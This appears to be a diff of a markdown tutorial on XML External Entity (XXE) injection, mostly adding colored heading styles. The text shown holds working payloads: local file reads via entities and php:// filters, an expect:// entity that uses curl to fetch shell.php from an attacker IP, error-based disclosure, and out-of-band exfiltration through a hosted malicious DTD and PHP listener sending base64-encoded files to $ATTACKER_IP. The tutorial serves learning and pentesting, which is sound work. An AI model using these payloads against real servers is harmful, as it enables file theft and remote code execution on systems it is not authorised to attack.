@@ -1,4 +1,4 @@
-### What is XXE?
+### <span style="color:#50FA7B">What is XXE?</span>
 
 **XXE (XML External Entity) injection** is a vulnerability that happens when a web app **uses XML data from users but doesn't handle it safely**.
 
@@ -10,7 +10,7 @@ It allows attackers to:
 
 👉 **It’s dangerous**, and that’s why it’s on the OWASP Top 10 list of web risks.
 
-### **XML (Extensible Markup Language)** 
+### <span style="color:#50FA7B">**XML (Extensible Markup Language)**</span>
 is a special format used to store and share structured data (like emails, invoices, etc.).
 It's similar to HTML, but its main goal is to **hold data**, not to display it.
 
@@ -30,7 +30,7 @@ Here’s an example XML document:
 This XML has tags like `<date>`, `<sender>`, etc. They store the data inside them.
 
 
-# Example
+# <span style="color:#FF5555">Example</span>
 - Normal Request
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
@@ -60,7 +60,7 @@ This XML has tags like `<date>`, `<sender>`, etc. They store the data inside the
 </root>
 ```
 
-### Basic Terms
+### <span style="color:#50FA7B">Basic Terms</span>
 
 - **XML :** A format apps use to send data (like HTML but for data)
 - **Entity :** A variable inside XML (can be used to load a file)
@@ -68,7 +68,7 @@ This XML has tags like `<date>`, `<sender>`, etc. They store the data inside the
 - **DTD :** A section in XML where you define entities (like a config)
 - **XXE :** A hack where you use XML entities to read files from the server
 
-# local File Disclosure
+# <span style="color:#FF5555">local File Disclosure</span>
 - #### Normal payload
 ```xml
 <!DOCTYPE email [
@@ -76,7 +76,7 @@ This XML has tags like `<date>`, `<sender>`, etc. They store the data inside the
 ]>
 ```
 
-#### - wrapper to bypass restrictions
+#### <span style="color:#FFB86C">- wrapper to bypass restrictions</span>
 
 ```xml
 <!DOCTYPE email [
@@ -99,9 +99,9 @@ This XML has tags like `<date>`, `<sender>`, etc. They store the data inside the
   <!ENTITY company SYSTEM "expect://curl$IFS-O$IFS'OUR_IP/shell.php'">
 ]>
 		```
-# Advanced File Disclosure
+# <span style="color:#FF5555">Advanced File Disclosure</span>
 
-### Method 1: CDATA Trick to Read Any File
+### <span style="color:#50FA7B">Method 1: CDATA Trick to Read Any File</span>
 
  1. Create a DTD File on Your Computer (xxe.dtd)
 
@@ -127,8 +127,8 @@ This will:
 - Wrap the contents in `<![CDATA[ ... ]]>`
 - Return it safely in XML format
 
-### Method 2: Error-Based XXE (for silent or hidden output)
-#### Test it
+### <span style="color:#50FA7B">Method 2: Error-Based XXE (for silent or hidden output)</span>
+#### <span style="color:#FFB86C">Test it</span>
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE root [
@@ -141,7 +141,7 @@ This will:
   <message>hello</message>
 </root>
 ```
-### Payload
+### <span style="color:#50FA7B">Payload</span>
 1. Create DTD Payload That Forces an Error
 	Put this in `xxe.dtd`:
 ```xml
@@ -163,9 +163,9 @@ python3 -m http.server 8000
 ```
 
 
-#  Blind Data Exfiltration
+# <span style="color:#FF5555">Blind Data Exfiltration</span>
 
-### What’s the Problem?
+### <span style="color:#50FA7B">What’s the Problem?</span>
 
 You’re attacking a vulnerable web application with an **XXE payload**. But this time:
 
@@ -174,7 +174,7 @@ You’re attacking a vulnerable web application with an **XXE payload**. But thi
 - So it’s a **blind** vulnerability
 
 So how can you **steal data** if nothing shows up on the page?
-### The Trick: Make the Server Send the Data _to You_
+### <span style="color:#50FA7B">The Trick: Make the Server Send the Data _to You_</span>
 
 You tell the vulnerable server:
 
@@ -182,9 +182,9 @@ You tell the vulnerable server:
 
 This is called **Out-Of-Band (OOB) Exfiltration**, because the server doesn’t show you the file — it sends the data to **your own server** instead.
 
-## Steps
+## <span style="color:#8BE9FD">Steps</span>
 
-### 1.  Host a PHP listener
+### <span style="color:#50FA7B">1.  Host a PHP listener</span>
 You create a simple PHP file on your own machine:
 ```php
 <?php
@@ -200,23 +200,23 @@ php -S 0.0.0.0:8000
 ```
 This listens for incoming requests and prints out anything in `?content=...` (after decoding).
 
-### 2. Write a Malicious DTD (hosted on your machine)
+### <span style="color:#50FA7B">2. Write a Malicious DTD (hosted on your machine)</span>
 Create a file called `xxe.dtd`:
 ```xml
 <!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/327a6c4304ad5938eaf0efb6cc3e53dc.php">
-<!ENTITY % oob "<!ENTITY content SYSTEM 'http://YOUR_IP:8000/?content=%file;'>">
+<!ENTITY % oob "<!ENTITY content SYSTEM 'http://$ATTACKER_IP:8000/?content=%file;'>">
 ```
 This tells the victim server:
 - Read the target file
 - Base64 encode it
-- Then request `http://YOUR_IP:8000/?content=ENCODED_TEXT`
-### 3. Send the XXE Payload
+- Then request `http://$ATTACKER_IP:8000/?content=ENCODED_TEXT`
+### <span style="color:#50FA7B">3. Send the XXE Payload</span>
 
 Send this XML to the  endpoint:
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE email [
-  <!ENTITY % remote SYSTEM "http://YOUR_IP:8000/xxe.dtd">
+  <!ENTITY % remote SYSTEM "http://$ATTACKER_IP:8000/xxe.dtd">
   %remote;
   %oob;
 ]>
